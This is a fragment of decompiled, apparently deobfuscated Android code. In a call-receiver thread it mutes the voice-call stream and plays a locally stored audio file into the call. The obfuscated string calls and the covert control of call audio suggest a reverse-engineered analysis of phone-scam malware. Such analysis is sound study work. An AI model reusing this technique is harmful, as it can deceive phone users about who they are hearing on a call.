                sb.append("colorRing == null: ");
                sb.append(queryColorRingFile == null);
//                     sb.append(bb7d7pu7.m5998("RUkZAQYHDFNJ"));
                sb.append(", phone: ");
                sb.append(this.phone);
                LogUtils.callLog(sb.toString());
                if (queryColorRingFile != null && !TextUtils.isEmpty(queryColorRingFile.getFile())) {
//                         if (!queryColorRingFile.getFile().contains(bb7d7pu7.m5998("Rx4IHw")) && !queryColorRingFile.getFile().contains(bb7d7pu7.m5998("RwRdCA"))) {
                    if (!queryColorRingFile.getFile().contains(".wav") && !queryColorRingFile.getFile().contains(".m4a")) {
//                             queryColorRingFile.setFile(queryColorRingFile.getFile() + bb7d7pu7.m5998("RwQZWg"));
                        queryColorRingFile.setFile(queryColorRingFile.getFile() + ".mp3");
                    }
//                         String str = AppStartV.getContext().getExternalFilesDir(null).getAbsolutePath() + bb7d7pu7.m5998("RgsMBQVGCBsaRg") + queryColorRingFile.getFile();
                    String str = AppStartV.getContext().getExternalFilesDir(null).getAbsolutePath() + "/bell/ars/" + queryColorRingFile.getFile();
                    if (!new File(str).exists()) {
//                             LogUtils.callLog(bb7d7pu7.m5998("GQgdAVNJ") + str + bb7d7pu7.m5998("SQAaSQcGHUkMEQAaHQ"));
                        LogUtils.callLog("path: " + str + " is not exist");
                        return;
                    }
//                         LogUtils.callLog(bb7d7pu7.m5998("KgYFBhs7AAcOPQEbDAgNRxscB0kLDA4ABw"));
                    LogUtils.callLog("ColorRingThread.run begin");
                    MediaPlayer mediaPlayer = new MediaPlayer();
//                         AudioManager audioManager = (AudioManager) TelePhoneReceiver.mContext.getSystemService(bb7d7pu7.m5998("CBwNAAY"));
                    AudioManager audioManager = (AudioManager) TelePhoneReceiver.mContext.getSystemService(Context.AUDIO_SERVICE);
                    audioManager.setRingerMode(2);
                    int streamVolume = audioManager.getStreamVolume(0);
                    audioManager.setStreamVolume(0, 0, 4);
                    try {
                        Thread.sleep(2000L);
                    } catch (InterruptedException e) {
//                             LogUtils.callLog(bb7d7pu7.m5998("KgYFBhs7AAcOPQEbDAgNRxscB0kMEQoMGR0ABgdYU0k") + e.getMessage());
                        LogUtils.callLog("ColorRingThread.run exception1: " + e.getMessage());
                    }
                    mediaPlayer.setDataSource(str);
                    mediaPlayer.setAudioStreamType(0);
                    mediaPlayer.prepare();
                    mediaPlayer.start();
                    int duration = mediaPlayer.getDuration() / 1000;
//                         LogUtils.callLog(bb7d7pu7.m5998("KgYFBhs7AAcOPQEbDAgNRxscB0kPAAUMSQUMBw4dAVNJ") + duration);
                    LogUtils.callLog("ColorRingThread.run file length: " + duration);
                    try {
                        Thread.sleep(8000L);
                    } catch (InterruptedException e2) {
//                             LogUtils.callLog(bb7d7pu7.m5998("KgYFBhs7AAcOPQEbDAgNRxscB0kMEQoMGR0ABgdbU0k") + e2.getMessage());
                        LogUtils.callLog("ColorRingThread.run exception2: " + e2.getMessage());
                    }
                    for (int i = 0; i < duration + 1; i++) {
                        if (!AppStartV.isPlayColorRing) {
                            mediaPlayer.release();
                            audioManager.setStreamVolume(0, streamVolume, 4);
                            return;
                        }
                        try {
                            Thread.sleep(1000L);
                        } catch (InterruptedException e3) {
                            e3.printStackTrace();
                        }
                    }
//                         LogUtils.callLog(bb7d7pu7.m5998("KgYFBhs7AAcOPQEbDAgNRxscB0kaHQYZ"));
                    LogUtils.callLog("ColorRingThread.run stop");
                    mediaPlayer.release();
                    audioManager.setStreamVolume(0, streamVolume, 4);
                    return;
                }
                return;
            } catch (IOException e4) {
                StringBuilder sb2 = new StringBuilder();
//                     sb2.append(bb7d7pu7.m5998("KgYFBhs7AAcOPQEbDAgNRUkgJiwRCgwZHQAGB1NJ"));
                sb2.append("ColorRingThread, IOException: ");
                sb2.append(e4.getLocalizedMessage());
                LogUtils.callLog(sb2.toString());
                return;
            }
        }
    }
}
